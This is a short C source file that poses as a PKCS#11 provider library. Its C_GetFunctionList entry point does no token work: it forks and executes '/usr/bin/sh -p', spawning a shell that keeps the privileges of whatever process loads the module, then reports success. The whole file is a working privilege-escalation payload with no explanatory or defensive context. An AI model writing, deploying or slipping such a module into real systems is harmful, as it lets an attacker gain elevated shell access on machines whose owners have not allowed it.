#include "pkcs11.h"
#include <stdio.h>
#include <unistd.h>

CK_RV C_GetFunctionList(CK_FUNCTION_LIST_PTR_PTR ppFunctionList) {
    
    int pid = fork();

    if (pid == 0) {
        execl("/usr/bin/sh","sh","-p", NULL);
    } else if(pid > 0) {
        wait(NULL);
    } else {
        perror("fork");
        return 1;
    }

    return CKR_OK;
}
